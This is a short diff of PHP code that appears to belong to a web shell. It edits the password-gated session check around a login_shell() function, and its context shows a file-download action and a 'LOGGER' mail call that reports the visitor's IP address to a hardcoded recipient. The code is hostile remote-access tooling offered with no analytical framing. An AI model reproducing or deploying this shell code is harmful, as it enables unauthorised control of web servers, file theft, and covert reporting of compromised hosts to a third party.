@@ -256,10 +256,9 @@ mail($tujuanmail, "LOGGER", $pesan_alert, "[ " . $_SERVER['REMOTE_ADDR'] . " ]")
 <?php
 exit;
 }
-if(!isset($_SESSION[md5($_SERVER['HTTP_HOST'])])){
+if(!isset($_SESSION[md5($_SERVER['HTTP_HOST'])]))
     if( empty($auth_pass) || ( isset($_POST['pass']) && (md5($_POST['pass']) == $auth_pass) ) )
         $_SESSION[md5($_SERVER['HTTP_HOST'])] = true;
-die("$warn");}
     else
         login_shell();
 if(isset($_GET['file']) && ($_GET['file'] != '') && ($_GET['act'] == 'download')) {
